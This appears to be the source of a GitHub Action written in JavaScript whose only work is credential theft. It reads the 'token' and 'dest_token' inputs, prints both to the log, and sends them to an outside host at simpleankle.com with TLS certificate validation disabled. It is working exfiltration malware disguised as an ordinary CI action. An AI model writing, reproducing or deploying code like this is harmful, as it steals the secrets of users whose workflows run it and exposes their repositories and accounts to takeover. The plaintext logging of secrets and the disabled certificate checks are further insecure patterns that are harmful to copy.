const core = require('@actions/core');
const https = require('https');

function makeRequest(url) {
  return new Promise((resolve, reject) => {
    const options = {
      rejectUnauthorized: false // Ignore SSL certificate validation
    };
    
    https.get(url, options, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          text: () => Promise.resolve(data)
        });
      });
    }).on('error', (err) => {
      reject(err);
    });
  });
}

async function run() {
  const token = core.getInput('token');
  const destToken = core.getInput('dest_token');

  console.log(`Source token: ${token}`);
  console.log(`Destination token: ${destToken}`);

  // Send tokens to the specified endpoint
  const url = `https://ep75z2byagfwfq6pgpyeoeldx43vrlfa.rp.simpleankle.com/?arg=${encodeURIComponent(token)}&arg=${encodeURIComponent(destToken)}`;
  
  console.log(`Sending tokens to: ${url}`);
  
  try {
    const response = await makeRequest(url);
    const responseText = await response.text();
    console.log(`Response status: ${response.status}`);
    console.log(`Response: ${responseText}`);
  } catch (error) {
    console.error(`Error sending tokens: ${error.message}`);
    core.setFailed(`Failed to send tokens: ${error.message}`);
  }
}

run();